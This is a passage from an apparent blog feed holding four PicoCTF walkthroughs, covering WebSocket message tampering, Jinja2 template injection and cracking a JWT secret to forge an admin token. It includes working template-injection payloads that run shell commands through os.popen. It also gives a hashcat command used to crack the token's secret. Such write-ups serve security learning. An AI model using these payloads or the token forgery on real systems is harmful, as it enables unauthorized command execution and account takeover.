]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*xmO_zJP7qmtGWLiHtdeRIQ.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*xmO_zJP7qmtGWLiHtdeRIQ.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">WebSockFish PicoCTF</title><link href="/blog/WebSockFishPicoCtf" rel="alternate" type="text/html" title="WebSockFish PicoCTF" /><published>2025-09-16T00:00:00-04:00</published><updated>2025-09-16T00:00:00-04:00</updated><id>http://localhost:4000/blog/WebSockFish-picoctf</id><content type="html" xml:base="/blog/WebSockFishPicoCtf"><![CDATA[<p>When we accessed the website, we found this:</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*4KmVEKucoc6ZP5RrNqeDOw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>It appears to be a normal chess game.</p>

<p>Even though I don’t know much about how to play this game, I’m going to make some random moves</p>

<p>Once I make the first move, in Burp Suite WebSocket history, we can see two requests made by me (the client) and the fish (the server).</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*lgl1MJRvjRj3WBEoA1LGpQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>I’m going to keep making more random moves until the fish wins, to see the whole process.</p>

<p>After a few random moves, instead of sending <code class="language-plaintext highlighter-rouge">eval [number]</code>, it sent ‘mate 3’ to the server.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*U0wL9yrqL7C3AfilUWAs6A.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>When I make more random moves, I reach the point where I can’t move anymore, and my last message to the server is ‘mate 1’.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*PraZf_AfyGn5PuJ9t1LrvQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now it’s time to make a move using Repeater to see what we can do with it.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*ZyjWuYiSPuFCxrAMm0UmRw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Let’s send <code class="language-plaintext highlighter-rouge">mate 1</code>.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*NdMMzI5nh0JfetVQXRAShQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Nothing. What if we go below 0?</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*mq7LaTHx8LBODx2XXxSEhA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Interesting, we checkmated. We win?? But there’s no flag?</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*v1GYh32UR5xxB9zjmn92zg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Nothing. Let’s change it to <code class="language-plaintext highlighter-rouge">eval -9999</code> first, and then we can keep pushing forward.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*0xi8bsLqVYhDFF-wz3ynBQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>By adding another 9 to <code class="language-plaintext highlighter-rouge">eval -9999</code>, we got the flag.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*1HxCbmb-J_EmKFWqvyTk0Q.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="ctf" /><category term="picoctf" /><category term="walkthrough" /><summary type="html"><![CDATA[<p>When we accessed the website, we found this:</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*uKuKNFiZss4ahdQvweK_Jw.jpeg" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*uKuKNFiZss4ahdQvweK_Jw.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">SSTI2 PicoCTF</title><link href="/blog/SSTI2PicoCTF" rel="alternate" type="text/html" title="SSTI2 PicoCTF" /><published>2025-09-16T00:00:00-04:00</published><updated>2025-09-16T00:00:00-04:00</updated><id>http://localhost:4000/blog/SST2-picoctf</id><content type="html" xml:base="/blog/SSTI2PicoCTF"><![CDATA[<p>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)</p>

<p>This is going to be challenging, but we’ve got this because, based on the description…</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/0*pH3T71KSqmj2LUip" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Using this image, we can test the site to see which templates we are working on.</p>

<p>from <code class="language-plaintext highlighter-rouge">${7 * 7}</code> didn’t work, <code class="language-plaintext highlighter-rouge">{{7 * 7}}</code> works -&gt; <code class="language-plaintext highlighter-rouge">{{7*’7'}}</code> works —&gt; jinja2 or twig</p>

<p>Based on this post, we have different payloads to be able to bypass this with Jinja2 <a href="https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/">https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/</a></p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('whoami')|attr('read')()}}
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dPHJA_Rrnb9ORHvdFGlKbg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="ctf" /><category term="picoctf" /><category term="walkthrough" /><summary type="html"><![CDATA[<p>I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*d2R1OXU4u4xLDzO7teA1eA.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*d2R1OXU4u4xLDzO7teA1eA.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">JaWT Scratchpad PicoCTF</title><link href="/blog/JawtPicoCtf" rel="alternate" type="text/html" title="JaWT Scratchpad PicoCTF" /><published>2025-09-16T00:00:00-04:00</published><updated>2025-09-16T00:00:00-04:00</updated><id>http://localhost:4000/blog/Jawtscratchpad-picoctf</id><content type="html" xml:base="/blog/JawtPicoCtf"><![CDATA[<p>Check the admin scratchpad!</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*9GKvmZAQrrEmEXiaC-iPCQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>We can’t log in as admin, so let’s log in as Jose.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*GoZethjTId1XK8Q3yIJ9jA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Now, let’s use Burp Suite for this.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*X67G8wjNyp0MEy232OHkdw.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>At the end of the website, it shows something like this : “You can use your name as a log in, because that’s quick and easy to remember! If you don’t like your name, use a short and cool one like <a href="https://github.com/magnumripper/JohnTheRipper">John</a>!”</p>

<p>As we know, John the Ripper is used to brute force, so that gives the idea that this should be a brute force challenge. In my case, I decided to use Hashcat.</p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  <pre><code class="Terminal">
hashcat -a 0 -m 16500 jwt wordlist
</code></pre>
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*dXSFOD1ykNt_Wce45g9VvQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>secret: ilovepico</p>

<p>I can use this secret password to create a new assigning key</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*Mh3rp9LE7726qtARV91z7w.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>After creating our new key, we changed the user from ‘jose’ to ‘admin’ and assigned the key we created.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*1XbjbbupiaT4D5lmB5lH-g.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>After that, we send the request.</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*kmTbUyqXJFnEvEB3-rcjvQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>Hello admin!</p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="ctf" /><category term="picoctf" /><category term="walkthrough" /><summary type="html"><![CDATA[<p>Check the admin scratchpad!</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*fcvxcEANcxQlqK--App_4A.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*fcvxcEANcxQlqK--App_4A.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">SSTI1 PicoCTF</title><link href="/blog/SSTI1PicoCTF" rel="alternate" type="text/html" title="SSTI1 PicoCTF" /><published>2025-09-16T00:00:00-04:00</published><updated>2025-09-16T00:00:00-04:00</updated><id>http://localhost:4000/blog/SST1-picoctf</id><content type="html" xml:base="/blog/SSTI1PicoCTF"><![CDATA[<p>I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps!</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*749ohjzhVKocSttt49oQWQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>If we type picoCTF , it would show this :</p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*We7v-m3zd-UQpEYLKxGCFA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>let’s try some template injection, in this case we are going to use this <code class="language-plaintext highlighter-rouge">{{7*7}}</code>:</p>

<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection?source=post_page-----0853498698d5---------------------------------------">PayloadsAllTheThings/Server Side Template Injection at master</a></p>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*p6nuwKmCpJDW8EQ2qJtakA.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>This time, we got 49 because 7 × 7 = 49. That means our injection works. Now, let’s try some more advanced injections.</p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*nIEgY-qk-0gDP50LEfcLdQ.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<div class="code-block-container">
  <span class="code-lang-tag">Terminal</span>
  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
    </svg>
  </button>
  
  <pre><code class="Terminal">
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -lah').read() }}
</code></pre>
  
</div>

<p><img src="https://miro.medium.com/v2/resize:fit:2000/1*ppTGzKKyJ-A80GgxnjNRNg.png" alt="Website initial view" class="zoomable-img" style="border: 2px solid #ccc; border-radius: 10px; cursor: zoom-in;" /></p>

<p>now we can read the flag.</p>
]]></content><author><name>Tobias Arevalo</name><email>heyyou@protonmail.com</email></author><category term="ctf" /><category term="picoctf" /><category term="walkthrough" /><summary type="html"><![CDATA[<p>I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps!</p>

]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*DSmBoEWa8L36cCY8PEBX4g.png" /><media:content medium="image" url="https://miro.medium.com/v2/resize:fit:720/format:webp/1*DSmBoEWa8L36cCY8PEBX4g.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>